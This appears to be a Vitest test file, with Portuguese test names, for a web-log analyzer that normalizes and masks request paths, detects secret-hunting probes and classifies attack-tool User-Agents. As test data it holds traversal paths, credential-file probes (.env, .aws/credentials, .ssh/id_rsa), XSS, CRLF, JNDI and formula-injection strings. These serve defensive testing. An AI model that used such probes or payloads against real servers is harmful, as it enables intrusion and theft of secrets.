import { describe, expect, it } from 'vitest';
import { fakeJwt, prng } from '../../test/support/alb-lines.js';
import { loginRouteLength } from './login-paths.js';
import { decodeOnce, isMaskedPath, MAX_MASKED_CHARS, maskPath, normalizePath, upToScript } from './path.js';
import { countBits, familiesOf, matchProbe, PROBE_FAMILIES } from './probes.js';
import { RouteTable, type WebRoute, webRouteSchema, webRoutesSchema } from './routes.js';
import { classifyUserAgent, isUaSample, MAX_UA_SAMPLE, sampleUserAgent } from './user-agent.js';

const normal = (raw: string): string => `/${normalizePath(raw).segments.join('/')}`;
const mask = (raw: string): string => maskPath(normalizePath(raw));

describe('caminho normalizado', () => {
  it.each([
    ['/Login', '/login'],
    ['//login///x/', '/login/x'],
    ['/./a/../login', '/login'],
    ['/../../etc', '/etc'],
    ['/%6cogin', '/login'],
    ['/a%2Fb', '/a/b'],
    ['/static/..%2f.env', '/.env'],
    ['/a\\b', '/a/b'],
    ['/login;jsessionid=ABC', '/login'],
    ['/x/..;/manager/html', '/manager/html'],
    ['/.env.', '/.env'],
    ['/.env%20', '/.env'],
    ['/.env%00.jpg', '/.env'],
    ['/a%3Fsenha=1', '/a'],
    ['/a%23b', '/a'],
    ['/%3F/../.env', '/.env'],
    ['/%00/../.env', '/.env'],
    ['/a%3Fb/c', '/a/c'],
    ['/%252e%252e/x', '/%2e%2e/x'],
    ['/%', '/%'],
    ['/%zz', '/%zz'],
    ['/', '/'],
    ['', '/'],
  ])('%s vira %s', (raw, expected) => {
    expect(normal(raw)).toBe(expected);
  });

  it('decodifica uma vez só', () => {
    expect(decodeOnce('%2541')).toBe('%41');
    expect(decodeOnce('sem porcento')).toBe('sem porcento');
  });

  it('tem teto de segmentos', () => {
    expect(normalizePath('/a'.repeat(1000)).segments).toHaveLength(64);
  });
});

describe('caminho mascarado', () => {
  const JWT = fakeJwt();

  it.each([
    ['/', '/'],
    ['/api/v1/produtos', '/api/v1/produtos'],
    ['/api/v1/pedidos/4412', '/api/v1/pedidos/{num}'],
    ['/o/550E8400-e29b-41d4-a716-446655440000/x', '/o/{uuid}/x'],
    ['/obj/5f2b1c9e8d7a6f5e4d3c2b1a', '/obj/{hex}'],
    ['/app.3f9a8c1d.js', '/app.{hex}.js'],
    ['/fulano@exemplo.com.br/x', '/{email}/x'],
    ['/fulano%40exemplo.com.br', '/{email}'],
    ['/fulano%2540exemplo.com.br', '/{token}'],
    [`/verificar/${JWT}`, '/verificar/{token}'],
    [`/x/${JWT}`, '/x/{token}'],
    ['/x/eyJhbGciOiJub25lIn0', '/x/{token}'],
    ['/pessoas/123.456.789-09', '/pessoas/{num}'],
    ['/doc/123.456.789-09.pdf', '/doc/{num}.pdf'],
    ['/doc/12345678909', '/doc/{num}'],
    ['/doc/cpf-12345678909', '/doc/cpf-{num}'],
    ['/doc/12.345.678%2F0001-90', '/doc/{num}/{num}'],
    ['/tel/+5511999990000', '/tel/{token}'],
    ['/tel/11-99999-0000', '/tel/{num}'],
    ['/reset/Zk3wE9', '/reset/{token}'],
    ['/reset/abcdef', '/reset/{token}'],
    ['/accounts/reset/MQ/set-password/', '/accounts/reset/{token}/set-password'],
    ['/accounts/reset/MQ/abc-def', '/accounts/reset/{token}/{token}'],
    ['/reset-password/kq', '/reset-password/{token}'],
    ['/convite/joao', '/convite/{token}'],
    ['/usuarios/joao.silva/fotos', '/usuarios/{token}/fotos'],
    ['/users/me/settings', '/users/me/settings'],
    ['/auth/token/refresh', '/auth/token/refresh'],
    ['/auth/reset.php', '/auth/reset.php'],
    ['/s/Xy9Zk2', '/s/{token}'],
    ['/x/AbCdE-FgHiJ-KlMnO-PqRsT', '/x/{token}'],
    ['/x/a1b2c3d4e5f6g7h8i9j0', '/x/{token}'],
    ['/promocao-de-inverno-em-toda-a-loja', '/promocao-de-inverno-em-toda-a-loja'],
    ['/promo%C3%A7%C3%A3o', '/{token}'],
    ['/a=b&senha=1', '/{token}'],
    ['/a:b', '/{token}'],
    ['/{num}', '/{token}'],
    ['/a%3Fb', '/{token}'],
    ['/a%3Fb/senha/c', '/{token}/{token}/{token}'],
    ['/x/a%23b/c', '/x/{token}/{token}'],
    ['/a%3Fb/../c', '/{token}'],
    ['/a/../b%3Fq', '/{token}'],
    ['/x/abcdefghijklmnopqrst', '/x/{token}'],
    ['/%E2%80%AE%6d', '/{token}'],
    ['/a%0d%0aSet-Cookie', '/{token}'],
    ['/%3Cscript%3E', '/{token}'],
    ['/=cmd', '/{token}'],
  ])('%s vira %s', (raw, expected) => {
    expect(mask(raw)).toBe(expected);
  });

  it('e-mail com arroba de largura total, texto bidi e zero-width não passam', () => {
    expect(mask('/joao＠exemplo.com')).toBe('/{token}');
    expect(mask('/a\u202egpj.exe')).toBe('/{token}');
    expect(mask('/lo\u200bgin')).toBe('/{token}');
    expect(mask('/ｌｏｇｉｎ')).toBe('/{token}');
  });

  it('até 8 segmentos e 256 caracteres', () => {
    expect(mask('/a/b/c/d/e/f/g/h/i/j')).toBe('/a/b/c/d/e/f/g/h/{etc}');
    const long = mask(
      `/${Array.from({ length: 8 }, () => 'palavra-palavra-palavra-palavra-palavra-palavra').join('/')}`,
    );
    expect(long.length).toBeLessThanOrEqual(MAX_MASKED_CHARS);
    expect(long.endsWith('/{etc}')).toBe(true);
  });

  it('qualquer entrada sai no formato mascarado', () => {
    const random = prng(11);
    for (let i = 0; i < 20_000; i += 1) {
      const length = Math.floor(random() * 60);
      let raw = '/';
      for (let j = 0; j < length; j += 1)
        raw += String.fromCharCode(Math.floor(random() * (i % 2 === 0 ? 128 : 0x3000)));
      const masked = mask(raw);
      expect(isMaskedPath(masked)).toBe(true);
    }
  });

  it('um segredo aleatório de 20 caracteres ou mais nunca sobra, com ou sem separador', () => {
    const random = prng(5);
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let leaked = 0;
    for (let i = 0; i < 5_000; i += 1) {
      let secret = '';
      for (let j = 0; j < 24; j += 1) secret += alphabet.charAt(Math.floor(random() * alphabet.length));
      if (mask(`/arquivo/${secret}`) !== '/arquivo/{token}') leaked += 1;
    }
    // Um base64url de 24 caracteres com separadores raros pode parecer palavras: fora do contexto de segredo, até 0,2%.
    expect(leaked).toBeLessThanOrEqual(10);
    for (let i = 0; i < 2_000; i += 1) {
      let secret = '';
      for (let j = 0; j < 24; j += 1) secret += alphabet.charAt(Math.floor(random() * 62));
      const masked = mask(`/reset/${secret}`);
      expect(['/reset/{token}', '/reset/{hex}', '/reset/{num}']).toContain(masked);
    }
  });
});

describe('sondas', () => {
  const probe = (raw: string) => matchProbe(normalizePath(raw).segments);

  it.each([
    ['/.env', 'env:.env'],
    ['/app/.ENV', 'env:.env'],
    ['/.env.production', 'env:production'],
    ['/.env.qualquer-coisa', 'env:*'],
    ['/%2eenv', 'env:.env'],
    ['/static/..%2f.env', 'env:.env'],
    ['/prod.env', 'env:named'],
    ['/.git/config', 'git:config'],
    ['/.git/HEAD', 'git:head'],
    ['/x/.git/refs/heads/main', 'git:.git'],
    ['/.aws/credentials', 'cloud_keys:.aws'],
    ['/.ssh/id_rsa', 'cloud_keys:.ssh'],
    ['/backup.sql', 'dump:backup.sql'],
    ['/2026.sql.gz', 'dump:*.sql.gz'],
    ['/site.zip', 'dump:site.zip'],
    ['/actuator/env', 'actuator:env'],
    ['/app/actuator/heapdump', 'actuator:heapdump'],
    ['/phpinfo.php', 'phpinfo:phpinfo'],
    ['/phpinfo.php/.env', 'phpinfo:phpinfo'],
    ['/info.php/wp-login.php', 'phpinfo:phpinfo'],
  ])('secreta: %s', (raw, signature) => {
    expect(probe(raw)).toMatchObject({ secret: true, signature });
  });

  it.each([
    ['/wp-admin/', 'wordpress'],
    ['/blog/wp-login.php', 'wordpress'],
    ['/phpMyAdmin/index.php', 'db_admin'],
    ['/manager/html', 'web_admin'],
    ['/cgi-bin/luci', 'device'],
    ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'php_rce'],
    ['/remote/login', 'remote_access'],
    ['/.DS_Store', 'server_config'],
  ])('de plataforma: %s', (raw, family) => {
    expect(probe(raw)).toMatchObject({ secret: false, family });
  });

  it.each([
    '/',
    '/environment',
    '/envio',
    '/.environment',
    '/actuator/health',
    '/actuator',
    '/manager',
    '/remote/control',
    '/relatorio.zip',
    '/.well-known/security.txt',
    '/gitconfig',
    '/sql',
    '/.sql',
  ])('não é sonda: %s', (raw) => {
    expect(probe(raw)).toBeNull();
  });

  it('as famílias cabem na máscara de bits', () => {
    expect(PROBE_FAMILIES.length).toBeLessThanOrEqual(31);
    expect(countBits(0b1011)).toBe(3);
    expect(familiesOf(0b101)).toEqual([PROBE_FAMILIES[0], PROBE_FAMILIES[2]]);
  });
});

describe('rotas de login sem configuração', () => {
  const route = (raw: string): string | null => {
    const { segments } = normalizePath(raw);
    const length = loginRouteLength(segments);
    return length === 0 ? null : `/${segments.slice(0, length).join('/')}`;
  };

  it.each([
    ['/login', '/login'],
    ['/Login.aspx', '/login.aspx'],
    ['/api/v1/user-login', '/api/v1/user-login'],
    ['/conta/entrar', '/conta/entrar'],
    ['/wp-login.php', '/wp-login.php'],
    ['/xmlrpc.php', '/xmlrpc.php'],
    // O fim do caminho é do atacante: trocar a cada tentativa não faz outra rota.
    ['/login.php/aaa', '/login.php'],
    ['/login/qualquer/coisa', '/login'],
    ['/auth/token', '/auth/token'],
    ['/auth/refresh', '/auth/refresh'],
    ['/auth.php/xyz', '/auth.php'],
    ['/users/sign_in', '/users/sign_in'],
    ['/sessions', '/sessions'],
  ])('%s é a rota %s', (raw, expected) => {
    expect(route(raw)).toBe(expected);
  });

  it.each(['/author', '/authors/1', '/session-events', '/blogin', '/tokenizer', '/produtos'])(
    '%s não é rota de login',
    (raw) => {
      expect(route(raw)).toBeNull();
    },
  );

  it('corta no script só quando há resto', () => {
    expect(upToScript(['a', 'b.php'])).toEqual(['a', 'b.php']);
    expect(upToScript(['a', 'b.php', 'c'])).toEqual(['a', 'b.php']);
  });
});

describe('rotas declaradas pelo cliente', () => {
  const base: WebRoute = {
    id: 'r1',
    host: null,
    method: 'POST',
    path: '/api/*/login',
    kind: 'login',
    failureCodes: [401],
    successCodes: [200],
    multiplier: 1,
  };
  const match = (routes: WebRoute[], host: string | null, method: string, raw: string): string | null =>
    new RouteTable(routes).match(host, method, normalizePath(raw).segments)?.route.id ?? null;

  it('casa por segmento, método e host', () => {
    expect(match([base], null, 'POST', '/api/loja-1/login')).toBe('r1');
    expect(match([base], null, 'POST', '/API/x/%6cogin/')).toBe('r1');
    expect(match([base], null, 'GET', '/api/x/login')).toBeNull();
    expect(match([base], null, 'POST', '/api/x/y/login')).toBeNull();
    expect(match([base], null, 'POST', '/api/login')).toBeNull();
    const hosted = { ...base, host: 'loja.exemplo.com.br' };
    expect(match([hosted], 'loja.exemplo.com.br', 'POST', '/api/x/login')).toBe('r1');
    expect(match([hosted], 'outra.exemplo.com.br', 'POST', '/api/x/login')).toBeNull();
    expect(match([hosted], null, 'POST', '/api/x/login')).toBeNull();
    expect(match([{ ...base, method: 'ANY', path: '/' }], null, 'GET', '/')).toBe('r1');
  });

  it('a mais específica ganha: host exato, depois menos curingas', () => {
    const routes = [
      { ...base, id: 'curinga', path: '/api/*/*' },
      { ...base, id: 'literal', path: '/api/x/login' },
      { ...base, id: 'host', path: '/api/*/*', host: 'h.exemplo.com.br' },
    ];
    expect(match(routes, null, 'POST', '/api/x/login')).toBe('literal');
    expect(match(routes, 'h.exemplo.com.br', 'POST', '/api/x/login')).toBe('host');
    expect(match(routes, null, 'POST', '/api/y/z')).toBe('curinga');
  });

  it('recusa caminho e valores fora do formato', () => {
    for (const path of [
      'login',
      '/a*',
      '/Login',
      '/a//b',
      '/a/b/c/d/e/f/g/h/i',
      '/a?b',
      '/(a+)+',
      '/a b',
      '/a/',
    ]) {
      expect(webRouteSchema.safeParse({ ...base, path }).success).toBe(false);
    }
    for (const change of [
      { multiplier: 0.4 },
      { multiplier: 11 },
      { failureCodes: [99] },
      { kind: 'x' },
      { extra: 1 },
    ]) {
      expect(webRouteSchema.safeParse({ ...base, ...change }).success).toBe(false);
    }
    expect(webRoutesSchema.safeParse([base, base]).success).toBe(false);
    const many = Array.from({ length: 51 }, (_, i) => ({ ...base, id: `r${i}` }));
    expect(webRoutesSchema.safeParse(many).success).toBe(false);
    expect(webRoutesSchema.safeParse(many.slice(0, 50)).success).toBe(true);
  });
});

describe('User-Agent', () => {
  it.each([
    ['sqlmap/1.7#stable (https://sqlmap.org)', 'sqlmap'],
    ['Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)', 'nikto'],
    ['Mozilla/5.0 (Nuclei - projeto aberto)', 'nuclei'],
    ['Fuzz Faster U Fool v2.1.0', 'ffuf'],
    ['gobuster/3.6', 'gobuster'],
    ['Mozilla/4.0 (Hydra)', 'hydra'],
  ])('ferramenta: %s', (agent, tool) => {
    expect(classifyUserAgent(agent)).toEqual({ tool, family: tool });
  });

  it.each([
    ['curl/8.5.0', 'curl'],
    ['python-requests/2.31', 'python'],
    ['Go-http-client/2.0', 'go'],
    ['hydrangea/1.0', 'other'],
    ['', 'empty'],
    ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'googlebot'],
  ])('não é ferramenta de ataque: %s', (agent, family) => {
    expect(classifyUserAgent(agent)).toEqual({ tool: null, family });
  });

  it.each([
    ['Mozilla/5.0 (X11; Linux) Chrome/140.0', 'Mozilla/5.0 (X11; Linux) Chrome/140.0'],
    ['bot (+https://exemplo.com.br/bot?id=1; contato@exemplo.com.br)', 'bot ({url}; {email})'],
    ['app/1.0 token=abcdef', 'app/1.0 {token}'],
    ['a\u202eb\u200bc', 'a b c'],
    ['=cmd|calc', '{token}'],
    ['"><script>alert(1)</script>', 'scriptalert(1)/script'],
    ['${jndi:ldap://x.exemplo.com.br/a}', '{url}'],
    ['cpf 12345678909 fim', 'cpf {num} fim'],
    ['eyJhbGciOiJIUzI1NiJ9 x', '{token} x'],
    ['{email}', '{email}'],
    ['{inventado}', null],
    ['', null],
  ])('amostra de %s', (agent, expected) => {
    expect(sampleUserAgent(agent)).toBe(expected);
  });

  it('qualquer entrada sai com até 120 caracteres do conjunto', () => {
    const random = prng(3);
    for (let i = 0; i < 5_000; i += 1) {
      let agent = '';
      const length = Math.floor(random() * 400);
      for (let j = 0; j < length; j += 1)
        agent += String.fromCharCode(Math.floor(random() * (i % 2 === 0 ? 256 : 0xffff)));
      const sample = sampleUserAgent(agent);
      if (sample === null) continue;
      expect(sample.length).toBeLessThanOrEqual(MAX_UA_SAMPLE);
      expect(isUaSample(sample)).toBe(true);
    }
  });
});
